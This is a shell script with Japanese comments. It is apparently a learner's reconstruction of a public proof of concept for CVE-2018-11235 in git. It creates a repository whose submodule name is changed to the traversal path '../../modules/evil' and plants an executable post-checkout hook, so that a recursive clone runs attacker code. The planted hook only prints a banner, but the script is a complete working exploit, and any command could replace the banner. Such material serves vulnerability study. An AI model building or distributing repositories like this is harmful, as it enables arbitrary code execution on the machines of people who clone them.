#!/bin/sh

# 悪意あるsubmoduleを含んだレポジトリ用のディレクトリを作成する
mkdir evil_repo
cd evil_repo
git init

# ここで追加するのは別になんでも良い
git submodule add https://github.com/otms61/innocent.git evil

# 正常な.git/modules/evilから攻撃コードを置く用の./modules/evilを用意する
mkdir modules
cp -r .git/modules/evil modules

# hookにセットするスクリプトを用意する
echo '#!/bin/sh' > modules/evil/hooks/post-checkout
echo 'echo >&2 "<<<<<<<<<<<<<<cve_2018_11235 CODE EXECUTION!!!!!!!>>>>>>>>>>>>>>>>>>"' >> modules/evil/hooks/post-checkout
chmod +x modules/evil/hooks/post-checkout

git add modules
git commit -am evil

# もとのPoCで設定されてたがよくわかっていない。。なくてもとりあえず動く。
git config -f .gitmodules submodule.evil.update checkout

# submoduleの名前をevilから ../../modules/evilに変更する
git config -f .gitmodules --rename-section submodule.evil submodule.../../modules/evil

# .git/moduleの下に何かないとcheckoutに失敗するので、普通のやつも用意してあげる
git submodule add https://github.com/otms61/innocent.git another-module
git add another-module
git commit -am another

git add .gitmodules
git commit -am .gitmodule